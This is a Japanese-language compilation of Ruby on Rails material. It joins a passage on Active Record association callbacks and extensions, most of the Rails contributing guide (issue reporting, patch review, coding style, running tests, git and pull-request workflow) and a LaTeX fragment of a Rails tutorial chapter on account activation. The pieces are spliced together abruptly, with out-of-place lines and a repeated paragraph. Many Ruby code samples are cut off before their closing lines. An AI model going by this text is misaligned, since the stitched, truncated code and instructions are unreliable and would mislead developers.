親オブジェクト(`has_and_belongs_to_many`関連付けを宣言している側のオブジェクト)が保存されない場合(つまり`new_record?`が`true`を返す場合)、子オブジェクトは追加時に保存されません。
`has_and_belongs_to_many`関連付けにオブジェクトをアサインし、しかもそのオブジェクトを保存したくない場合、`collection.build`メソッドを使用してください。
### 関連付けのコールバック
通常のコールバックは、Active Recordオブジェクトのライフサイクルの中でフックされます。これにより、オブジェクトのさまざまな場所でコールバックを実行できます。
たとえば、`:before_save`コールバックを使用して、オブジェクトが保存される直前に何かを実行することができます。
関連付けのコールバックも、上のような通常のコールバックとだいたい同じですが、(Active Recordオブジェクトではなく)コレクションのライフサイクルによってイベントがトリガされる点が異なります。
以下の4つの関連付けコールバックを使用できます。
* `before_add`
* `after_add`
* `before_remove`
* `after_remove`
これらのオプションを関連付けの宣言に追加することで、関連付けコールバックを定義できます。
  has_many :orders, before_add: :check_credit_limit
  def check_credit_limit(order)
Railsは、追加されるオブジェクトや削除されるオブジェクトをコールバックに(引数として)渡します。
1つのイベントで複数のコールバックを使用したい場合には、配列を使用して渡します。
  has_many :orders,
    before_add: [:check_credit_limit, :calculate_shipping_charges]
  def calculate_shipping_charges(order)
`before_add`コールバックが例外を発生した場合、オブジェクトはコレクションに追加されません。
同様に、`before_remove`で例外が発生した場合も、オブジェクトはコレクションに削除されません。
### 関連付けの拡張
Railsは自動的に関連付けのプロキシオブジェクトをビルドしますが、開発者はこれをカスタマイズすることができます。
無名モジュール(anonymous module)を使用してこれらのオブジェクトを拡張(検索、作成などのメソッドを追加)することができます。
  has_many :orders do
    def find_by_order_prefix(order_number)
      find_by(region_id: order_number[0..2])
拡張を多くの関連付けで共有したい場合は、名前付きの拡張モジュールを使用することもできます。
module FindRecentExtension
  def find_recent
    where("created_at > ?", 5.days.ago)
  has_many :orders, -> { extending FindRecentExtension }
  has_many :deliveries, -> { extending FindRecentExtension }
関連付けプロキシの内部を参照するには、`proxy_association`アクセサにある以下の3つの属性を使用します。
* `proxy_association.owner`は、関連付けを所有するオブジェクトを返します。
* `proxy_association.reflection`は、関連付けを記述するリフレクションオブジェクトを返します。
* `proxy_association.target`は、`belongs_to`または`has_one`関連付けのオブジェクトを返すか、`has_many`または`has_and_belongs_to_many`関連付けオブジェクトのコレクションを返します。
それではマイグレーションを実行しましょう。
Ruby on Rails に貢献する方法
本ガイドでは、Ruby on Railsの開発に「あなた」が参加する方法について説明します。
* GitHubでissueをレポートする方法
* マスターをcloneしてテストスイートを実行する方法
* 既存のissueを解決する方法
* Ruby on Railsのドキュメントに貢献する方法
* Ruby on Railsのコードに貢献する方法
Ruby on Railsは、「どこかで誰かがうまくやってくれているフレームワーク」ではありません。
Ruby on Railsには、長年に渡って数百人もの人々が貴重な貢献を行ってくださいました。その内容は、わずか1文字の修正から、大規模なアーキテクチャ変更、重要なドキュメント作成まで多岐に渡ります。それらの努力は、いずれもRuby on Railsをすべての人々にとってよりよいものにすることを目標に置いています
コードを書いたりドキュメントを作成したりするまでには至らなくても、issueのレポートやパッチのテストなど、さまざまな方法で貢献することができます (訳注: **サンプルの文章も日本語に翻訳されていますが、実際には必ず英語を使うようにしてください** )。
issueのレポート
Ruby on Railsでは[GitHubのIssueトラッキング](https://github.com/rails/rails/issues)機能を使用してissueをトラッキングしています。主にバグや、新しいコードの貢献に使用されます。
Ruby on Railsでバグを見つけたら、そこから貢献を開始できます。
Githubへのissue送信、コメント、プルリクエストの作成を行うには、まずGitHubアカウント (無料) を作成する必要があります。
NOTE: Ruby on Railsの最新リリースで見つけたバグは最も注目を集める可能性があります。
また、Railsコアチームは、_edge Rails_ (その時点での開発版Railsのコード) でのテストに時間を割いてくれる方からのフィードバックを常に歓迎しています。
テスティング用にedge Railsを入手する方法については後述します。
### バグレポートを作成する
<n><n>If you've found a problem in Ruby on Rails which is not a security risk, do a search in GitHub under [Issues](https://github.com/rails/rails/issues) in case it has already been reported. If you do not find any issue addressing it you may proceed to [open a new one](https://github.com/rails/rails/issues/new). 
セキュリティ上のissueをレポートする方法については次のセクションで説明します。
issueレポートには、最低でもタイトルとissueの明快な説明が必要です。
できるだけ多くの関連情報を含めるようにしてください。また、少なくとも問題を再現できるコードサンプルも合わせて投稿してください。
期待される動作が行われていないことを示す単体テストも含めてもらえるとさらに助かります。
バグの再現と修正点の把握を、他の人達にとっても自分自身にとってもやりやすくすることを目指してください。
そして、issueの扱いについて過度な期待を抱かないことも肝心です。
「地球滅亡クラス」の重大な問題でもない限り、レポートしてもらったissueは他のissueと同様に、解決に向けて共同作業が行われるようになります。
issueレポートが自動的に修正担当者を見つけてくれることもありませんし、他の開発者が自分の作業を差し置いてまで修正してくれることもありません。
issueを作成するということはほとんどの場合、自分にとっては問題修正のスタートラインに着くことであり、他の開発者にとっては「こちらでも同じ問題が起きてます」と確認およびコメントを追加する場所ができたということに過ぎません。
### セキュリティissueの特殊な取り扱い方法について
WARNING: セキュリティ脆弱性に関する問題は、一般公開されているGithubのissueレポート機能には「絶対に掲載しないでください」。
セキュリティ関連のissueを扱う方法の詳細については、[Railsセキュリティポリシーページ](http://rubyonrails.org/security) (英語) を参照してください。
### 機能リクエストについて
GitHubのIssueには「機能リクエスト」を記入しないでください。
Ruby on Railsで欲しい機能があるなら、自分でコードを書いてください。あるいは、誰かにお願いしてコードを書いてもらってください。
Ruby on Rails用のパッチを提案する方法については後述します。
たとえGitHubのissueにこのような「欲しい機能リスト」をコードも添えずに書き込んだところで、Issueをチェックした人によって早晩「無効」とマーキングされて終わるでしょう。
その一方、「バグ」と「機能」の線引きはそう簡単ではないこともあります。
一般に、「機能」はアプリケーションに新しい振る舞いを追加するものであり、バグとは既存の振る舞いが期待どおりでないことを示します。
コアチームは、必要に応じてバグか機能かを審査するための招集をかけることもあります。
とはいうものの、バグか機能かの違いは、送っていただいたパッチを (ボツにするかどうかというよりは)、どのリリースに反映するかという扱いの違いでしかないことがほとんどです。バグ修正は早めにリリースされ、機能追加は大きなリリース変更のときに反映されるといった具合です。私たちは、修正パッチと同様に機能追加も大歓迎しています。
送っていただいた機能追加をメンテナンス用ブランチに押し込めておしまい、というようなことはしていません。
機能追加用のパッチを送信する前に自分のアイディアに意見を募りたい場合は、[rails-coreメーリングリスト](https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-core)にメールを送信してください。もし誰からも返信がなければ、自分のアイディアに誰も関心を持っていないということがわかります。
あるいは、自分のアイディアに興味を示してくれる人が返信してくれるかもしれません。
あるいは「悪いけどそれは採用できそうにないね」という返信かもしれません。
しかしこのメーリングリストは、こうしたアイディアについて議論するために用意された場所です。
逆にGitHubのissueは、こうした新しいアイディアのために必要な議論 (ときには長期かつ複雑になることもあるでしょう) を行うための場所ではありません。
既存のissueの解決を手伝う
----------------------------------
issueのレポートに続く貢献方法として、コアチームが既存のissueを解決するのを手伝うこともできます。
Githubのissueにあがっている[皆からのissue](https://github.com/rails/rails/issues)を見てみると、注目を集めているissueがたくさん見つかります。
自分も何かissueに貢献できる方法はあるでしょうか。
もちろんあります。それもいろんな方法があります。
### バグレポートの確認
初歩的な貢献として、バグレポートを確認する作業も大変役に立ちます。
issueを自分のコンピュータで再現できるかどうかを試してみましょう。
問題をうまく再現できたら、そのことをissueのコメントに追加しましょう。
再現手順などにあいまいな点があるなら、どこがわかりにくいかを指摘しましょう。
バグを再現するために有用な情報を追加したり、不要な手順を削除したりするのも重要な貢献です。
テストが添えられていないバグレポートを見かけたら、貢献のチャンスです。バグが原因で失敗するテストを作成して貢献できます。
テストの書き方は、既存のテストファイルを詳しく読むことで学べます。これは、Railsのソースコードをみっちり探索するためのよいきっかけにもなります。
作成するテストは「パッチ」の形式にしてもらえるとベストです。詳しくは「Railsのコードに貢献する」で後述します。
バグレポートは、とにかく簡潔でわかりやすく、そしてなるべく簡単に現象を再現できるように書いてください。バグを修正する開発者にとって何よりありがたいのは、このような「よいバグレポート」です。たとえバグレポートを作成するあなたが最終的にコードを書かなくても、よいバグレポートは大きな貢献となります。
### パッチをテストする
GitHubからRuby on Railsに送信されたプルリクエスト (pull request、プルリクとも) をチェックしてくれる人もいると助かります。
寄せられた修正を適用するには、まず次のように専用のブランチを作成してください。
$ git checkout -b testing_branch
続いて、このリモートブランチを使用してローカルのコードベースを更新します。
たとえばGitHubユーザーであるJohnSmithが、forkしてhttps://github.com/JohnSmith/railsの"orange"というトピックブランチにpushしたとします。
$ git remote add JohnSmith git://github.com/JohnSmith/rails.git
$ git pull JohnSmith orange
ブランチを適用したらテストしてみます。
次のような点に注意しながら進めましょう。
* 修正は本当に有効か。
* このテストで自分は幸せになれるか。
何がテストされているのかを自分が理解できているか。
足りないテストはないか。
* ドキュメントに適切な記載があるか。
ドキュメントも更新する必要があるか。
* 実装が楽しいと思えるか。
同じ変更をもっと高速かつ素晴らしい方法で実装する方法を思い付けるか。
プルリクエストに含まれている変更点がよいものであると思えたら、GitHubのissueに賛成を表明(approval)するコメントを追加してください。
追加するコメントでは、まずその変更に賛成していることを表明しつつ、なるべく具体的にどの変更点がよいと思ったのかについても示しましょう。
たとえば次のようにコメントします。
>I like the way you've restructured that code in generate_finder_sql - much nicer. (generate_finder_sqlのコードが非常によい形で再構築されている点がよいと思います)。
The tests look good too. (テストもよく書けているようです)。
単に「+1」とありがちなコメントを残すだけでは、他のレビュアーはほとんど注目してくれないでしょう。
コメントするあなたが十分時間をかけてプルリクエストを読んだということが皆に伝わるように書きましょう。
Railsのドキュメントに貢献する
---------------------------------------
Ruby on Railsには2種類のドキュメントがあります。ひとつはこのガイドであり、Ruby on Railsを学ぶためのものです。もうひとつはAPIドキュメントであり、こちらはリファレンス用です。
どなたでもRailsガイドの改善に貢献することができます。Railsガイドに求められる改善とは、「一貫していること」「矛盾がないこと」「読みやすいこと」「情報の追加」「事実と異なっている部分の修正」「タイポの修正」「最新のedge Railsに追い付くこと」などです。
[Rails](http://github.com/rails/rails)にプルリクエストを送ることができます。常連貢献者になったら、[Railsコアチーム](http://rubyonrails.org/core)に
ただし、docrailsにはプルリクエストを送信しないでください。自分で書いた変更への意見が欲しい場合は、[Rails](http://github.com/rails/rails)の方でお願いします。
docrailsは定期的にmasterにマージされますので、Ruby on Railsドキュメントの編集を効率よく行えます。
ドキュメントの変更内容について不明な点がある場合は、GitHubの[Rails](https://github.com/rails/rails/issues) issueトラッカーでissueを作成してください。
ドキュメント関連で貢献したい場合は、[API ドキュメント作成のガイドライン](api_documentation_guidelines.html) と[Rails ガイドのガイドライン](ruby_on_rails_guides_guidelines.html) をよく読んでからにしてください。
NOTE: 前述のとおり、コードにパッチを当てる際には、ドキュメントもそれに対応して適切に書かれる必要があります。
docrailsは、コーディングから独立したドキュメンテーションのみを目的としています。
NOTE: RailsのCI (継続的インテグレーション: Continuous Integration) サーバーの負荷を減らすために、ドキュメント関連のコミットメッセージには[ci skip]と記入してください。こうすることで、コミット時のビルドはスキップされます。
[ci skip] は「ドキュメントのみの変更」以外では使用できません。コードの変更には絶対使用しないでください。
WARNING: docrailsには次の厳格なポリシーが制定されていることを理解しておく必要があります: 「docrailsのコードは1文字たりとも絶対に変更しないこと」
「docrailsで変更してよいのはRDocとガイドのみ」
「docrailsのchangelogも絶対に変更しないこと」
Railsのコードに貢献する
### development環境を構築する
バグレポートを送信して既存の問題解決を手伝ったり、コードを書いてRuby on Railsに貢献したりするためには、ぜひともテストスイートを実行できるようにしておく必要があります。
このセクションでは、自分のパソコン上でテスト用の環境を構築する方法について解説します。
#### おすすめの方法
[Rails development box](https://github.com/rails/rails-dev-box)にあるできあいのdevelopment環境を入手するのがおすすめです。
#### 面倒な方法
Rails development boxを利用できない事情がある場合は、Railsガイドの[Railsコア開発環境の構築方法](development_dependencies_install.html)をご覧ください。
### Railsリポジトリをクローンする
コードに貢献するには、まずRailsリポジトリをクローンするところから始める必要があります。
$ git clone git://github.com/rails/rails.git
続いて、専用のブランチを作成します。
$ cd rails
$ git checkout -b my_new_branch
このブランチの名前はローカルコンピュータの自分のリポジトリ上でしか使われないので、どんな名前でも構いません。
この名前がRails Gitリポジトリにそのまま取り込まれることはありません。
### ローカルブランチでアプリケーションを実行する
ダミーのRailsアプリで変更をテストする必要がある場合は、`rails new`に`--dev`フラグを追加すると、ローカルブランチを使用するアプリケーションが生成されます。
$ bundle exec rails new ~/my-test-app --dev
`~/my-test-app`で生成されたアプリケーションはローカルブランチのコードを実行します。サーバーを再起動すると、設定の変更をアプリケーションで確認できます。
### コードを書く
体制が整ったので、早速コードを追加・編集しましょう。
現在のGitブランチで存分にコードを書くことができます (念のため`git branch -a`を実行して、正しいブランチにいることを確認しておきましょう)。
自分のコードをRailsに追加するのであれば、以下の点を心がけてください。
* 正しいコードを書くこと。
* Railsで皆が使用している慣例やヘルパーメソッドを使用すること。
* テストを書くこと。自分のコードがないと失敗し、あると成功するテストであること。
* 関連するドキュメント、実行例、ガイドなど、コードが影響する部分はすべて更新すること。
TIP: 表面的なものにとどまる変更や、Railsの安定性/機能性/テストのしやすさの根本的な部分を何も改良しないような変更は受け付けられません。詳細については [our rationales behind this decision](https://github.com/rails/rails/pull/13771#issuecomment-32746700) (英語) を参照してください。
#### Railsコーディングルールに従う
Railsのコーディングを行う場合は、以下のシンプルなスタイルガイドに従います。
* インデントはスペース2つを使用する。タブ文字は使用しないこと。
* 行末にスペースを置かないこと。
空行に余分なスペースを置かないこと。
* privateやprotectedの後の行はインデントする。
* ハッシュの記法は Ruby 1.9 以降の書式を使用する。
つまり「`{ :a => :b }`」よりも「`{ a: :b }`」が望ましい。
* 「`and`/`or`」よりも「`&&`/`||`」が望ましい。
* クラスメソッドは「self.method」よりも「class << self」が望ましい。
* 等号の前後にはスペースを置く。「`a=b`」ではなく「`a = b`」とすること。
* refuteではなくassert_notを使用すること。
* 単一行ブロックはスペース無しの「`method{do_stuff}`」よりもスペースありの「`method { do_stuff }`」が望ましい。
* その他、Railsのコードにある既存の書式に従うこと。
上はあくまでガイドラインであり、最適な使用方法については各自でご判断ください。
### ベンチマークを行う
自分の書いたコードによってRailsのパフォーマンスが低下するのであれば、比較のために[benchmark-ips](https://github.com/evanphx/benchmark-ips) gemを使用してベンチマークの結果も添えてください。
benchmark-ipsの実行例を以下に示します。
詳細については、benchmark/ips の [README](https://github.com/evanphx/benchmark-ips/blob/master/README.md)を参照してください。
### テストを実行する
Railsでは、変更をプッシュする時にテストスイートをフル実行するという慣習があるわけではありません。
おすすめのワークフーロー[rails-dev-box](https://github.com/rails/rails-dev-box)で説明しているように、railtiesのテストは特に時間がかかり、ソースコードを`/vagrant`にマウントするとさらに時間がかかります。
現実的な妥協案として、作成したコードによって影響が生じるかどうかをテストするようにしてください。そして、変更がrailtiesで行われていないのであれば、影響を受けるコンポーネントのすべてのテストスイートを実行してください。
テストにすべてパスすれば、貢献を提案する準備が整います。
Rails では、他の箇所で予想外のエラーが生じたときに検出できるよう、[Travis CI](https://travis-ci.org/rails/rails)を使用しています。
#### Rails 全体のテストを実行する
すべてのテストを実行するには以下のようにします。
$ bundle exec rake test
#### 特定のコンポーネントのテストを実行する
Action Packなど、特定のコンポーネントのテストのみを実行することもできます。
たとえば、Action Mailerの場合は以下を実行します。
$ cd actionmailer
#### 単一のテストを実行する
Rubyで単一のテストを実行することができます。
たとえば次のようになります。
`-n`オプションを指定すると、ファイル全体ではなく指定した単一のメソッドだけを実行します。
#### Active Recordをテストする
SQLite3 のみ、Active Recordのテストで以下を実行します。
$ cd activerecord
$ bundle exec rake test:sqlite3
これで、`sqlite3`で行った場合と同様にテストを実行できるようになります。
タスクはそれぞれ以下のようになります。
test:mysql
test:mysql2
test:postgresql
最後に以下を実行します。
これで4つが順に実行されます。
単一のテストを個別に実行することもできます。
$ ARCONN=sqlite3 ruby -Itest test/cases/associations/has_many_associations_test.rb
ひとつのテストをすべてのアダプターに対して実行するには以下のようにします。
$ bundle exec rake TEST=test/cases/associations/has_many_associations_test.rb
これで`test_jdbcmysql`、`test_jdbcsqlite3`、`test_jdbcpostgresql`も呼び出されます。
特定のデータベーステストにターゲットを絞って実行する方法の詳細については`activerecord/RUNNING_UNIT_TESTS.rdoc`を参照してください。CI (Continuous Integration: 継続的インテグレーション)サーバーでテストスイートを実行する方法の詳細については`ci/travis.rb`を参照してください。
### 警告
テストスイートの実行では、警告表示がオンになります。
Ruby on Railsのテストで警告がひとつも表示されないのが理想ですが、サードパーティのものも含めて若干の警告が表示されてしまうことがあります。
無視するという手もありますが、可能であれば修正をお願いします。そしてできれば、新しい警告を表示しないようにするためのパッチの送信もお願いします。
出力を見やすくするためにフラグをオーバーライドすることもできます (ただしオプションの意味を十分理解したうえでですが)。
$ RUBYOPT=-W0 bundle exec rake test
### CHANGELOGの更新
CHANGELOGはすべてのリリースで重要な位置を占めます。
Railsの各バージョンの変更点をここに記録します。
リファクタリングやドキュメント変更の場合はCHANGELOGを変更しないでください。
必要であれば複数行にわたってエントリを記入したり、スペース4つのインデントを置いたコード例を記入したりすることもできます。
変更が特定のissueに関連する場合は、issue番号も記入してください。
CHANGELOGエントリの例を以下に示します ( **訳注: 実際は英語で書きます** )。
*  (変更内容の要約を記入します)
(複数行の
    エントリを記入する場合は80文字目で折り返します)
(必要に応じてインデント付きのコード例を追加できます)
        class Foo
          def bar
            puts 'baz'
          end
        end
    （コード例に続けてエントリを書くこともできます。issue番号はここに書きます）
GH#1234
    *自分の名前*
### Gemfile.lockを更新する
そのような場合は、`bundle update` を実行して正しい依存関係バージョンを反映し、変更の`Gemfile.lock`ファイルにコミットしてください。
### 健全性チェック
コードに目を通したのが自分以外にいない状態でコードを送信するのはよくありません。
身近にRails使いがいる場合は、送信前にコードを詳しくチェックしてもらいましょう。
身近にRails使いがいない場合は、IRCルームやrails-coreメーリングリストでお問い合わせください。
### 変更をコミットする
自分のPC上のコードに満足がいくようになったら、変更をGitにコミットします。
$ git commit -a
短い要約文 (50 文字以下だと理想的)
もちろん、必要であればもっと詳しく書いてください。
メッセージは72文字目で改行してください。
    class ArticlesController
      def index
箇条書きの点を追加することもできます。
TIP: コミットが複数にわたっている場合は、必ず 1 つのコミットにスカッシュ(squash)しておいてください。
### ブランチを更新する
ローカルで作業している間に、masterで別の更新が行われているということがよくあります。
更新をローカルに取り込みましょう。
$ git checkout master
$ git pull --rebase
続いて、最新の変更のトップにパッチを再度適用しましょう。
$ git checkout my_new_branch
$ git rebase master
コンフリクトは生じなかったか、
テストはパスするか、
取り込んだ変更は納得できる内容か。
それらを確認してから次に進みましょう。
### フォーク
Rails [GitHubリポジトリ](https://github.com/rails/rails) を開いて、右上隅にある [Fork] を押します。
ローカルPC上のローカルリポジトリに新しいリモートを追加します。
$ git remote add mine git@github.com:<自分のユーザー名>/rails.git
リモートにプッシュします。
$ git push mine my_new_branch
フォークしたリポジトリをローカルにクローンし、オリジナルのRailsリポジトリをリモートとして追加することもできます。このような場合は次のように行う必要があります。
フォークのクローンを保存したディレクトリで以下を実行します。
$ git remote add rails git://github.com/rails/rails.git
Railsの公式リポジトリから新しいコミットとブランチをダウンロードします。
$ git fetch rails
ダウンロードした新しいコンテンツをマージします。
$ git rebase rails/master
フォークをアップデートします。
$ git push origin master
別のブランチをアップデートしたい場合は以下のようにします。
$ git checkout branch_name
$ git rebase rails/branch_name
$ git push origin branch_name
### プルリクエストを発行する
プッシュしたRailsアプリケーションのリポジトリを開いて (ここではhttps://github.com/your-user-name/rails にあるとします)、右ペインにある [Pull Requests] をクリックします。
次のページで右上隅の [New pull request] を押します。
比較対象のブランチを変更したい場合は [Edit] をクリックし、(デフォルトではmasterが比較対象になります)。[Click to create a pull request for this comparison] をクリックします。
自分が導入した変更セットが含まれていることを確認します。
送信したいパッチの詳細を記入し、わかりやすいタイトルを付けます。
終わったら、[Send pull request] を押します。
送信したプルリクエストはRailsコアチームに知らされます。
### フィードバックを受け取る
送信したプルリクエストがマージされるまでには、何回か再挑戦が必要になるでしょう。
あなたのプルリクエストに対して別の意見を持つコントリビュータがいるかもしれません。多くの場合、プルリクエストがマージされるまでにパッチを何度か更新する必要もあるでしょう。
GitHubのメール通知機能をオンにしているRailsコントリビュータもいますが、そうでない人もいます。
Railsに携わっている人のほとんどはボランティアなので、プルリクエストに何らかの反応が生じるまでに数日かかることもざらにあります。どうかめげずにプルリクエストをどしどし送信してください。
びっくりするほど早く反応がもらえることもあれば、そうでないこともあります。
それがオープンソースというものです。
一週間経っても何の音沙汰もないようなら、少しつっついてみましょう。
[rubyonrails-coreメーリングリスト](http://groups.google.com/group/rubyonrails-core/)をご利用ください。
プルリクエストに自分でコメントを追加してみてもよいでしょう。
せっかくなので、自分のプルリクエストへの反応を待っている間に、他の人のプルリクエストを開いてコメントしてみましょう。
あなたのパッチに反応があったときとおなじぐらい、その人たちもきっと嬉しく思うことでしょう。
### 必要なら何度でもトライする
Railsに貢献すべく活動していれば、そのプルリクエストはここを変えた方がよいのではないかというフィードバックを受けることがきっと一度や二度あるでしょう。
そういうことがあっても、どうか落ち込まないでください。オープンソースプロジェクトに貢献するうえで肝心なのは、コミュニティの知恵を遠慮なく活用させてもらうことです。
コミュニティのメンバーがあなたのコードの調整を求めているのであれば、そのとおりにして再送信する価値があります。
そのコードはRailsのコアにおくべきではないというフィードバックを受けたなら、gemの形でリリースする方がよいかもしれません。
#### コミットをスカッシュする
Railsに貢献する皆様には、必ず「コミットをスカッシュ」していただくようお願いします。スカッシュとは、複数のコミットをひとつにまとめることです (訳注: 後述の`git rebase -i`でスカッシュできます)。
プルリクエストは、ひとつのコミットにまとめておくことが望まれます。
コミットをひとつにまとめることで、安定版ブランチに新しい変更をバックポートしやすくなり、よくないコミットを取り消しやすくなり、Gitの履歴を多少なりとも追いやすくなります。
Railsは巨大プロジェクトであり、異質なコミットが多数加わると膨大なノイズが生じる可能性があります。
以下の作業を行うには、メインのRailsリポジトリを指すGitリモートを取得する必要があります。
Gitリモートは他の場面でも何かと便利なものですが、まだ作成していない場合は以下を最初に行ってください。
$ git remote add upstream https://github.com/rails/rails.git
このリモートはupstream以外の名前にも設定できます。`upstream`という名前にしたくない場合は、以下の手順に従って名前を変更します。
リモートブランチ名が`my_pull_request`の場合は、以下を実行します。
$ git fetch upstream
$ git checkout my_pull_request
$ git rebase upstream/master
$ git rebase -i
< 最初のひとつを除くすべてのコミットに対して'squash'を選択する >
< コミットメッセージを編集して、すべての変更をわかりやすく記述する >
$ git push origin my_pull_request -f
以上でGitHub上のプルリクエストを更新できるようになり、実際に更新されたことを確認できます。
#### プルリクエストを更新する
あなたがコミットしたコードに対して変更を求められることがあります。
既存のコミットそのものを修正することを求められることもあります。
ただし、Gitでは既存のコミットをさかのぼって変更したものをプッシュすることは許されていません。既にプッシュされたブランチとローカルのブランチが一致しないからです。
このような場合は、新しいプルリクエストを作成する代わりに、コミットのスカッシュについて既に説明した方法を使用して、自分のブランチをGitHubに強制的にプッシュすることもできます。
これにより、GitHub上のブランチとプルリクエストが新しいコードによって更新されます。
強制的にプッシュを行うと、リモートブランチのコミットが失われる危険性がありますので、くれぐれもご注意ください。
### 旧バージョンのRuby on Rails
以前のバージョンのRuby on Railsに修正パッチを当てたい場合は、設定を行ってローカルのトラッキングブランチに切り替える必要があります。
たとえば4-0-stableブランチに切り替える場合は以下のようにします。
$ git branch --track 4-0-stable origin/4-0-stable
$ git checkout 4-0-stable
TIP: [シェルのプロンプトにGitブランチ名を表示](http://qugstart.com/blog/git-and-svn/add-colored-git-branch-name-to-your-shell-prompt/)すると、今どのバージョンで作業しているかがその場で確認できるので便利です。
#### バックポート
変更がmasterにマージされると、その変更はRailsの次期メジャーリリースに採用されます。
常にというわけではありませんが、変更を過去の安定版のメンテナンス用にバックポートできるとよい場合があります。
一般に、セキュリティ修正とバグ修正は、バックポートの候補になります。新機能や動作変更用パッチはバックポートの候補には採り入れられません。
自分の変更がどちらに該当するかわからない場合は、余分な作業をせずに済むためにも、変更をバックポートする前にRailsチームのメンバーにご相談ください。
単純な修正をバックポートする最も簡単な方法は、[masterと自分の変更のdiffをとって対象ブランチに適用する](http://ariejan.net/2009/10/26/how-to-create-and-apply-a-patch-with-git)ことです。
最初に、masterと自分の変更のdiff以外に差分がないことを確認します。
$ git log master..
次にdiffを展開します。
$ git format-patch master --stdout > ~/my_changes.patch
対象ブランチに切り替えて変更を適用します。
$ git checkout -b my_backport_branch 3-2-stable
$ git apply ~/my_changes.patch
単純な変更であればこれで十分バックポートできます。
しかし、複雑な変更を行っていた場合や、masterと対象ブランチの差が甚だしくなっている場合は、もう少し手を加える必要があるかもしれません。
バックポートがどのぐらい難しくなるかは場合によって大きく異なります。ときには、それほどの手間をかけてバックポートするほどの意味がないこともあります。
コンフリクトをすべて解消してすべてのテストがパスすることを確認できたら、変更をプッシュして、バックポート用のプルリクエストを別に作成します。
なお、古いブランチではビルドのターゲットがmasterと異なるセットになっている場合がありますのでご注意ください。
できれば、`.travis.yml`に記載されているバージョンのRubyを使用してバックポートをローカルでテストしてからプルリクエストを送信するようにしてください。
Railsコントリビュータ
masterやdocrailsへの貢献が認められた方々は[Railsコントリビュータ](http://contributors.rubyonrails.org)にその名を連ねています。
どなたでもRailsガイドの改善に貢献することができます。Railsガイドに求められる改善とは、「一貫していること」「矛盾がないこと」「読みやすいこと」「情報の追加」「事実と異なっている部分の修正」「タイポの修正」「最新のedge Railsに追い付くこと」などです。
  class Application < Rails::Application
\href{http://www.michaelhartl.com/}{マイケルハートル (Michael Hartl)} は「\href{http://www.railstutorial.org/}{\emph{Ruby on Rails チュートリアル}}」という Web 開発を始めるときに最もよく参考にされる本の著者です。また、\href{http://www.softcover.io/}{Softcover} という自費出版プラットフォームの共同創業者でもあります。
以前は、(今ではすっかり古くなってしまいましたが)「\emph{RailsSpace}」という本の執筆および開発に携わったり、また、 一時人気を博した Ruby on Rails ベースのソーシャルネットワーキングプラットフォーム「Insoshi」の開発にも携わっていました。
なお、2011年には、Rails コミュニティへの高い貢献が認められて、\href{http://rubyheroes.com/heroes}{Ruby Hero Award} を受賞しました。
\href{http://college.harvard.edu/}{ハーバード大学}卒業後、\href{http://resolver.caltech.edu/CaltechETD:etd-05222003-161626}{カリフォルニア工科大学}で\href{http://www.caltech.edu/}{物理学博士号}を取得し、起業プログラム \href{http://ycombinator.com/}{Y Combinator} の卒業生でもあります。
第\ref{cha:updating_showing_and_deleting_users}章では、基本的なUsersリソース (表\ref{table:RESTful_users}の標準的なRESTアクションをすべて使用) と、自由道の高い認証 (authentication) および認可 (authorization) システムを作成しました。
本章ではこのシステムの仕上げとして、互いに強く関連している2つの機能、すなわちアカウントの有効化 (アクティベーション: 新規ユーザーのメールアドレスが有効であることを確認する機能) と、パスワードの再設定 (パスワードを忘れてしまったユーザー向けの機能) を実装することにします。
これらの機能ごとに新しいリソースを作成し、それぞれのコントローラ/ルーティング/データベース移行の例について見ていくことにします。
その途中で、Railsの開発環境や本番環境からメールを送信する方法についても学習します。
最後に、2つの機能を完全に連携させます。パスワードを再設定すると、パスワード再設定用のリンクがメールで送信され、その宛先メールアドレスが有効であることは最初のアカウント有効化で確認済みである、といった具合です
\footnote{
細かいことを言えば、\ref{sec:updating_users}のアカウント設定更新機能を使って、おかしなメールアドレスを設定することもできてしまいます。ここで行う実装では、メールによるメールアドレス検証のメリットを (やりすぎない範囲で) 十分享受できるはずです。
}<n><n>\section{Account activation} % (fold)<n>\label{sec:account_activation}<n><n>
今の状態では、新しくアカウントを登録したユーザーはアカウントに対するフルアクセス権限を持っています (第\ref{cha:sign_up}章) が、このままではいかにも大雑把です。
そこで、アカウントを有効化する手順を実装して、ユーザーが登録に使用したメールアドレスを本当に所有、管理しているのかどうかを確認するようにしましょう。
これを行うおおよその流れは、有効化トークンやダイジェストをユーザーと関連付け、ユーザーにメールを送信し、そのメールにはトークンを含むリンクを記載しておき、ユーザーがそのリンクをクリックすると有効化できるようになる、というものです。
アカウントを有効化する段取りは、ユーザーログイン (\ref{sec:logging_in})、特にユーザーの記憶 (\ref{sec:remember_me}) と似ています。
基本的な手順は次のようになります。
ユーザーの初期状態は「有効化されていない」(unactivated) にしておく。
ユーザー登録が行われたときに、有効化トークンと、それに対応する有効化ダイジェストを生成する。
有効化ダイジェストはデータベースに保存しておき、有効化トークンはメールアドレスと一緒に、ユーザーに送信する有効化用メールのリンクに仕込んでおく
せっかくユーザーIDが既にアプリケーションのURLでそのまま使われているのですから、メールアドレスの代わりにユーザーIDを使うという手ももちろんあります。ただ、メールアドレスにしておけば、将来何らかの理由でユーザーIDをぼかしておきたくなる場合に役に立つかもしれません (競合他社があなたのアプリケーションのユーザー数を推測しにくいようにしたい、など)。
ユーザーがメールのリンクをクリックしたら、アプリケーションはメールアドレスをキーにしてユーザーを探し、データベース内に保存しておいた有効化ダイジェストと比較することでトークンを認証する。
ユーザーを認証できたら、ユーザーのステータスを「有効化されていない」から「有効化済み」(activated) に変更する。
都合の良いことに、今回実装するアカウント有効化やパスワード再設定の仕組みと、以前に実装したパスワードや記憶トークンの仕組みにはよく似た点が多いので、多くのアイデアを使い回すことができます (\kode{User.digest}メソッド、\kode{User.new\_token}メソッド、改造版の\kode{user.authenticated?}メソッドなど)。
表\ref{table:password_token_digest}に両者の似ている点を示します (\ref{sec:password_reset}のパスワード再設定も含む)。
\ref{sec:activating_the_account}.の表\ref{table:password_token_digest} を元に、より一般性の高い\kode{authenticated?}メソッドを定義することにします。
検索キー
authenticated?(:remember, token)
authenticated?(:activation, token)
authenticated?(:reset, token)
ログイン/記憶トークン/アカウントの有効化/パスワードの再設定で似ている点
それではいつものように、Gitで新機能用のトピックブランチを作成しましょう。
\ref{sec:email_in_production}で説明したとおり、アカウントの有効化とパスワードの再設定では、メールの設定部分に共通するところがありますので、その部分を両機能に適用してからGitのmasterにマージします。
